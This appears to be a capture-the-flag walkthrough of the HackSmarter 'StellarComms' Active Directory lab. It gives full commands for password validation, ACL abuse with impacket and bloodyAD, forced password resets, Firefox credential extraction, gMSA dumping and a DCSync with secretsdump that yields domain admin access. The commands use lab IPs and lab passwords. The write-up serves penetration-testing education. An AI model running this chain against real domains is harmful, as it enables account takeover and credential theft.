# StellarComms

StellarComms is a medium difficulty Active Directory machine from HackSmarter that starts with a username provided by the client, with no password. This leads to credentials found via anonymous FTP access, followed by Bloodhound analysis of the domain. From there, we see that our user has the ability to eventually change the password of another user. Upon compromising that user, we gather credentials via Firefox ESR. These credentials eventually allow us to perform a DCSync attack agains the Domain Controller.

The box was pretty fun to work through, it had some fun elements to it and some rabbit holes if you were not careful.

**Non-standard Tools Used**

https://github.com/NTHSec/nxcspray

https://github.com/CravateRouge/bloodyAD

https://github.com/NeCr00/Credential-Hunting

## Initial Recon & Enumeration

We are provided with the username junior.analyst, but no password.

```bash
rustscan -a 10.1.136.251 -- -Pn -sVC -oN full-tcp-scan.txt
```

<img width="1658" height="1208" alt="image" src="https://github.com/user-attachments/assets/2e233b4f-f336-4d88-97ac-05fc8c643592" />

Our intial scans show us that this is a Domain Controller within an Active Directory environment. We know this because of the presence of tcp/88 (Kerberos) and tcp/389 (LDAP)

We see there is also FTP, SMB, RDP, WinRM, and a HTTP web server running.

### HTTP Enumeration

The HTTP web server running ended up being a dead end on the target, however, it would play the Interstellar theme song when you navigated to the site. This was great, except it did blow my ear drums out at 11pm.

<img width="1503" height="837" alt="image" src="https://github.com/user-attachments/assets/2c5dfc4c-34e5-4235-a578-7714c7e5dfe0" />

Our directory brute force showed nothing interesting:

```bash
gobuster dir -u http://stellarcomms.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 100 -o gobuster-medium.txt
gobuster dir -u http://stellarcomms.local -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,aspx,html,txt,bak,git -k -t 16 -o gobuster-with-extensions.txt
```

<img width="1655" height="310" alt="image" src="https://github.com/user-attachments/assets/5ee9575c-5db4-4d53-8090-86038c5f6839" />

<img width="1737" height="377" alt="image" src="https://github.com/user-attachments/assets/1a4d6b37-0fbe-4d24-b181-77b2eff455b8" />

### SMB Enumeration

We don't have null or guest authentication available:

<img width="1552" height="147" alt="image" src="https://github.com/user-attachments/assets/3b0670aa-e61f-4287-9471-bd5327e931cf" />


### FTP Enumeration

We have anonymous FTP access allowed, so we can connect there and see if there are any intersting files.

<img width="918" height="268" alt="image" src="https://github.com/user-attachments/assets/4afbfd37-df26-4a08-b82e-e47dbca0cb4b" />

Inside of the "Docs" directory, we see some .pdf and .txt files:

<img width="828" height="201" alt="image" src="https://github.com/user-attachments/assets/b8c69742-8300-4526-becb-6af6844454ce" />

I was struggling to get the .pdf files to pull down correctly at first, after some research, I realized I probably needed to run `binary`, and this would allow for them to pull down nicely - So I did that.

<img width="2229" height="740" alt="image" src="https://github.com/user-attachments/assets/2271499d-10ad-4f45-976c-c01d7f0ac17c" />

Checking out "Browser_policy.pdf", we see that users are only allowed to have Firefox ESR (Extended Support Release). It also says credentials saved in browsers are not monitored... that information may come in handy later.

<img width="1688" height="1055" alt="image" src="https://github.com/user-attachments/assets/1f109e4c-405d-434d-9015-ea41e1373918" />


Upon opening the .pdf file "Stellar_UserGuide.pdf", we see a default user password - "Galaxy123!"

Somehow my screenshot for this in my notes got corrupted, so I should probably come back and add that...

Using the password we got, we can check it against our provided user name to see if it is valid. I'll do this with nxcspray:

```bash
nxcspray all 10.1.136.251 -u 'junior.analyst' -p 'Galaxy123!'
```

<img width="1608" height="383" alt="image" src="https://github.com/user-attachments/assets/e7bbb01d-af3f-4367-97c9-f66b53e95c32" />

So our password is valid, but we don't have WinRM or RDP access - I know RDP has a +, but we are looking for "Pwned!".

We can pull down a users list via Netexec and then perform the following:
1. Password spraying with our known password
2. AS-REP Roasting
3. Kerberoasting

<img width="1625" height="207" alt="image" src="https://github.com/user-attachments/assets/27a370f5-e2ec-467c-a5a9-537a4f78952e" />

<img width="1540" height="223" alt="image" src="https://github.com/user-attachments/assets/f9fb32de-bacd-4244-bc9c-db1ea73a47ff" />

<img width="1540" height="223" alt="image" src="https://github.com/user-attachments/assets/0e52f72f-0ce8-4649-9290-f88c857fd077" />

<img width="1275" height="108" alt="image" src="https://github.com/user-attachments/assets/cd446c6f-12b7-4657-a99e-b1454fa9c3b2" />

Our known password is not used anywhere else, all users require Kerberos pre-authentication, and no Kerberoastable users.

Next, we can collect Bloodhound data and do an analysis there.

```bash
bloodhound-python -u 'junior.analyst' -p 'Galaxy123!' -d stellarcomms.local -ns 10.1.136.251 -c all --zip
```

Upon our initial analysis, we see our user has WriteOwner over the group "StellarOps-Control"

<img width="1432" height="260" alt="image" src="https://github.com/user-attachments/assets/f283b6e3-0866-4ecf-9142-1faea5fb5a8b" />

Users in that group can reset the password for the user Ops.Controller

<img width="1401" height="246" alt="image" src="https://github.com/user-attachments/assets/10214eff-3751-4adf-bf44-95c7c535ab96" />

So our current attack path looks like:
1. Take ownership of the group "StellarOps-Control"
2. Give ourselves permission to add users to the group
3. Add ourselves to the group
4. Reset the password for Ops.Controller

So let us do just that! We start with taking owner ship of the group, that can be down with Impacket's owneredit.py:

```bash
impacket-owneredit -action write -new-owner 'junior.analyst' -target-dn 'CN=STELLAROPS-CONTROL,CN=USERS,DC=STELLARCOMMS,DC=LOCAL' 'stellarcomms.local'/'junior.analyst':'Galaxy123!' -dc-ip 10.1.136.251
```

<img width="2034" height="173" alt="image" src="https://github.com/user-attachments/assets/141ea6a3-4b09-4d42-9f69-4ff4f7463fe4" />

Then we give ourselves permissions to add users with Impacket's dacledit.py:

```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'junior.analyst' -target-dn 'CN=STELLAROPS-CONTROL,CN=USERS,DC=STELLARCOMMS,DC=LOCAL' 'stellarcomms.local'/'junior.analyst':'Galaxy123!' -dc-ip 10.1.136.251
```

<img width="2200" height="129" alt="image" src="https://github.com/user-attachments/assets/35101d4f-bd57-443c-883c-f2d01f5ea9e0" />

Then we add ourselves to the group using the net command in Linux:

```bash
net rpc group addmem "STELLAROPS-CONTROL@STELLARCOMMS.LOCAL" "junior.analyst" -U "stellarcomms.local"/"junior.analyst"%'Galaxy123!' -S 10.1.136.251
```

<img width="1644" height="103" alt="image" src="https://github.com/user-attachments/assets/3ab16e5f-d2a9-476e-b1f0-b4fb1ee2b18c" />

Finally, we change the password to the user Ops.Controller using bloodyAD:

```bash
bloodyAD -u 'junior.analyst' -p 'Galaxy123!' -d stellarcomms.local --host 10.1.136.251 set password 'ops.controller' 'Password123!'
```

<img width="1544" height="93" alt="image" src="https://github.com/user-attachments/assets/f6055543-88e6-4e0c-9adb-d82b6cf479b7" />

Now we can re-run our nxcspray as Ops.Controller:

<img width="1692" height="388" alt="image" src="https://github.com/user-attachments/assets/168a49c8-706a-4b6f-a749-3a277b219d31" />

We have WinRM access, so we login and check our privileges immediately:

<img width="1403" height="700" alt="image" src="https://github.com/user-attachments/assets/089f3273-46f8-490f-918a-c735c6086018" />

Trying to run winPEAS, we see that Defender is active on the target and it shuts down the execution of the file:

<img width="1256" height="169" alt="image" src="https://github.com/user-attachments/assets/d6fa18f9-c42d-484e-a1b1-128b54b810c3" />

Running a tool I like to use called credshunter.ps1, we see a couple interesting file paths pointed out:

- C:\Users\ops.controller\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
- C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles

<img width="1115" height="249" alt="image" src="https://github.com/user-attachments/assets/f376b05e-ac10-40da-bf98-5e476f6a2686" />


This was my first time ever trying to pull Firefox credentials from a target, so I had to do some research. I came cross this blog post:

https://x7331.gitbook.io/boxes/tl-dr/infra/file-artifacts/mozilla

That post indicated we could use a tool called "firepwd-ng.py" to extract passwords from the logins.json and the key4.db file in "C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles\v8mn7ijj.default-esr"

<img width="1219" height="830" alt="image" src="https://github.com/user-attachments/assets/887b19ac-8c38-44c2-85ea-f769ce9fbd84" />

```bash
python firepwd-ng.py -d ~/hack-smarter/labs/stellarcomms/firefox-loot
```

<img width="1037" height="225" alt="image" src="https://github.com/user-attachments/assets/58ba0ae9-a1dc-4dfd-aa88-cf0465a54936" />

Hey, cool, that worked! So now we have the credentials for the user Astro.Researcher - Lets check Bloodhound and see if they have any interesting outbound object control:

<img width="1339" height="253" alt="image" src="https://github.com/user-attachments/assets/61abc452-6420-49eb-8729-6ad2027e02e1" />

Okay, they have the WriteDACL over the user Eng.Payload, what outbound object control do they have?

<img width="1378" height="260" alt="image" src="https://github.com/user-attachments/assets/b415779f-4240-48c8-91fb-17b696d5225a" />

Okay, Eng.Payload can read the gMSA password of the account SatLink-Service$ - gMSA stands for "Group Managed Service Account" - Essentially, this account is a service account that is supposed to be more secure... supposed to be.

What outbound object control does SatLink-Service$ have? Ah, they have the GetChanges permission over the domain - This means we can perform a DCSync attack and dump the NTLM hash for the Domain Admin (Administrator) account!

<img width="1316" height="367" alt="image" src="https://github.com/user-attachments/assets/67d83f47-9b2c-42c3-8e3b-b8329618e0a4" />

So our attack path looks like this:
1. Get FullControl right over Eng.Payload
2. Change Eng.Payload's password
3. Dump the gMSA password hash for SatLink-Service$
4. Perform a DCSync attack as SatLink-Service$

First we get FullControl over Eng.Payload using Impacket's dacledit.py:

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'astro.researcher' -target 'eng.payload' 'stellarcomms.local'/'astro.researcher':'Cosmos@42'
```

Then we change Eng.Payload's password with bloodyAD:

```bash
bloodyAD -u 'astro.researcher' -p 'Cosmos@42' -d 'stellarcomms.local' --host 10.1.136.251 set password 'eng.payload' 'Password123!'
```

<img width="1659" height="242" alt="image" src="https://github.com/user-attachments/assets/4fec89fb-abdc-4b0a-a5f9-fdf7eb1855ae" />

Next, we use the Netexec LDAP module to dump the gMSA password:

```bash
nxc ldap stellarcomms.local -u 'eng.payload' -p 'Password123!' --gmsa
```

<img width="1609" height="134" alt="image" src="https://github.com/user-attachments/assets/0a6d1e1f-4204-434a-ad4e-058c1a6e61df" />

Now we use the password hash for that user with Impacket's secretsdump.py to perform the DCSync attack:

```bash
impacket-secretsdump stellarcomms.local/'SATLINK-SERVICE$'@10.1.136.251 -hashes 00000000000000000000000000000000:bb1e60ed6e3d58f615159127a81844ed
```

I think secretsdump.py does require the NTLM hash, and since we only have the NT hash, we can put 32 0s as the LM since it doesn't really matter.

<img width="1715" height="698" alt="image" src="https://github.com/user-attachments/assets/c15138aa-a036-4f30-8130-c5a7290cea0e" />

Now, using the NT hash, we can access the target via Evil-WinRM and grab our flags!

<img width="1380" height="828" alt="image" src="https://github.com/user-attachments/assets/a3ee4ea9-3b69-4645-8439-ace21a3f52ce" />
